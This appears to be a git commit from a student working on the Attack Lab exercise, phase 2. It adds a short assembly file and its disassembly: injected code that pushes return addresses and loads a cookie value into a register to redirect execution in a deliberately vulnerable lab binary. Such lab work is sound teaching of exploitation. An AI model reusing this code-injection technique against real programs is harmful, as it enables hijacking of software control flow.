1671781b85bd0d460c734555c35119d9c6b1ec9a
SugarSBN <15952265117@126.com>
2022-04-17 16:59:33 +0800

    phase_2

---
+++ attacklab/test.asm
@@ -0,0 +1,11 @@
+
+test.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	5f                   	pop    %rdi
+   1:	68 00 19 40 00       	push   $0x401900
+   6:	68 ec 17 40 00       	push   $0x4017ec
+   b:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
---
+++ attacklab/test.s
@@ -0,0 +1,4 @@
+popq %rdi
+pushq $0x401900
+pushq $0x4017ec
+mov $0x59b997fa, %edi
